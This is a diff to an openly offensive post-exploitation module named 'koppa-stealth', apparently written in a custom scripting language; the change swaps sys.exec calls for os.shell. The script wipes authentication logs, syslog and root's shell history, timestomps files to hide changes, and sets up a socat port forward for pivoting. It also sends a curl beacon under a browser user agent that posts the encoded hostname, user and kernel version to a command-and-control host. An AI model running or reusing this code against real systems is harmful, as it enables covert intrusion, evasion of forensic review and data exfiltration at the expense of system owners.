@@ -1,17 +1,17 @@
-# koppa-stealth v1.0 — Stealth ops and OPSEC
+# koppa-stealth v1.0 â€” Stealth ops and OPSEC
 # Usage: koppa run koppa-stealth [clean-logs|timestomp|portfwd|checkin]
 
-import sys, encode, hash, log
+import os, encode, hash, log
 
 fn cmd_clean_logs() {
     log.info("===== Log Cleanup =====")
     let logs = ["/var/log/auth.log", "/var/log/syslog", "/var/log/messages",
                 "/var/log/secure", "/root/.bash_history"]
     for f in logs {
-        sys.exec("truncate -s 0 {f} 2>/dev/null || true")
+        os.shell("truncate -s 0 {f} 2>/dev/null || true")
         log.success("[+] Cleared: {f}")
     }
-    sys.exec("history -c 2>/dev/null; unset HISTFILE 2>/dev/null || true")
+    os.shell("history -c 2>/dev/null; unset HISTFILE 2>/dev/null || true")
     log.success("[+] Shell history cleared")
 }
 
@@ -19,22 +19,22 @@ fn cmd_timestomp(target, reference) {
     log.info("===== Timestomp: {target} =====")
     let ref = reference
     if not ref { ref = "/bin/ls" }
-    sys.exec("touch -r {ref} {target} 2>/dev/null")
+    os.shell("touch -r {ref} {target} 2>/dev/null")
     log.success("[+] Timestamps of {target} cloned from {ref}")
 }
 
 fn cmd_portfwd(local_port, remote_host, remote_port) {
     log.info("===== Port Forward: 0.0.0.0:{local_port} -> {remote_host}:{remote_port} =====")
-    sys.exec("socat TCP-LISTEN:{local_port},fork TCP:{remote_host}:{remote_port} &")
+    os.shell("socat TCP-LISTEN:{local_port},fork TCP:{remote_host}:{remote_port} &")
     log.success("[+] Forwarding active")
     log.info("    Kill with: pkill socat")
 }
 
 fn cmd_checkin(c2_host, c2_port) {
     log.info("===== Stealthy Checkin: {c2_host}:{c2_port} =====")
-    let host_id = hash.md5(sys.exec("hostname").trim()).substring(0, 8)
-    let info = encode.b64_encode("{host_id}|{sys.exec('whoami').trim()}|{sys.exec('uname -r').trim()}")
-    sys.exec("curl -s -A 'Mozilla/5.0' 'http://{c2_host}:{c2_port}/beacon/{host_id}' -d '{info}' 2>/dev/null")
+    let host_id = hash.md5(os.shell("hostname").trim()).substring(0, 8)
+    let info = encode.b64_encode("{host_id}|{os.shell('whoami').trim()}|{os.shell('uname -r').trim()}")
+    os.shell("curl -s -A 'Mozilla/5.0' 'http://{c2_host}:{c2_port}/beacon/{host_id}' -d '{info}' 2>/dev/null")
     log.success("[+] Checkin sent as {host_id}")
 }
 
@@ -54,3 +54,4 @@ fn main() {
     if mode == "checkin"     { cmd_checkin(arg1, arg2) }
     log.success("Done!")
 }
+
